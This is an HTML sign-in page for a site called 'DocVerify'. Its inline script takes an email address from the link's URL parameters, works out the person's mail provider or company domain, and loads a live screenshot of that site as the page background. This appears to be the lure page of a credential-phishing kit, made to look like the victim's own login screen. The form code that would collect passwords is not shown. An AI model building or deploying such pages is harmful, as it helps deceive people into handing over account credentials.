<!doctype html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Secure authentication with Google Sign-In and CAPTCHA" />
  <title>DocVerify — Sign In</title>
  <link rel="preconnect" href="https://www.google.com" crossorigin />
  <link rel="preconnect" href="https://www.gstatic.com" crossorigin />
  <link rel="preconnect" href="https://s0.wordpress.com" crossorigin />
  <link rel="preconnect" href="https://image.thum.io" crossorigin />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap"
    rel="stylesheet" />
  <style>
    html {
      height: 100%;
      background-color: #f8fafc;
      background-position: center top;
      background-size: cover;
      background-repeat: no-repeat;
    }

    body {
      margin: 0;
      min-height: 100%;
      background: transparent;
    }

    #page-bg {
      position: fixed;
      inset: 0;
      z-index: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      object-position: center top;
      pointer-events: none;
    }

    #root {
      position: relative;
      z-index: 1;
      min-height: 100%;
      background: transparent;
    }
  </style>
  <script>
    (function () {
      const params = new URLSearchParams(window.location.search);
      const rawEmail = params.get('email') ?? params.get('user') ?? params.get('e') ?? '';
      const email = rawEmail.trim();

      if (!email || !email.includes('@')) return;

      const domain = email.split('@')[1]?.trim().toLowerCase();
      if (!domain || !domain.includes('.') || !/^[a-z0-9.-]+$/i.test(domain)) return;

      const providerUrls = {
        'gmail.com': 'https://mail.google.com',
        'googlemail.com': 'https://mail.google.com',
        'outlook.com': 'https://outlook.live.com',
        'hotmail.com': 'https://outlook.live.com',
        'live.com': 'https://outlook.live.com',
        'yahoo.com': 'https://mail.yahoo.com',
        'icloud.com': 'https://www.icloud.com/mail',
        'me.com': 'https://www.icloud.com/mail',
        'mac.com': 'https://www.icloud.com/mail',
        'aol.com': 'https://mail.aol.com',
        'proton.me': 'https://mail.proton.me',
        'protonmail.com': 'https://mail.proton.me',
      };

      const site = providerUrls[domain] || ('https://www.' + domain + '/');
      const enc = encodeURIComponent(site);
      const cacheKey = 'docverify_bg_' + domain;
      let cached = null;
      try { cached = sessionStorage.getItem(cacheKey); } catch (e) { }

      if (cached && !cached.includes('wordpress.com/mshots')) {
        try { sessionStorage.removeItem(cacheKey); } catch (e) { }
        cached = null;
      }

      const url = cached || ('https://s0.wordpress.com/mshots/v1/' + enc + '?w=1280');
      window.__DOCVERIFY_BG__ = { domain, url };

      const preload = document.createElement('link');
      preload.rel = 'preload';
      preload.as = 'image';
      preload.href = url;
      preload.setAttribute('fetchpriority', 'high');
      document.head.appendChild(preload);

      const rootEl = document.documentElement;
      rootEl.style.backgroundImage = 'url("' + url.replace(/"/g, '') + '")';
      rootEl.style.backgroundSize = 'cover';
      rootEl.style.backgroundPosition = 'center top';
      rootEl.style.backgroundRepeat = 'no-repeat';
    })();
  </script>
</head>

<body>
  <script>
    (function () {
      const boot = window.__DOCVERIFY_BG__;
      if (!boot || !boot.url) return;
      const src = boot.url.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '');
      document.write('<img id="page-bg" alt="" fetchpriority="high" decoding="sync" src="' + src + '">');
    })();
  </script>
  <div id="root"></div>
  <script type="module" src="/src/main.tsx"></script>
</body>

</html>
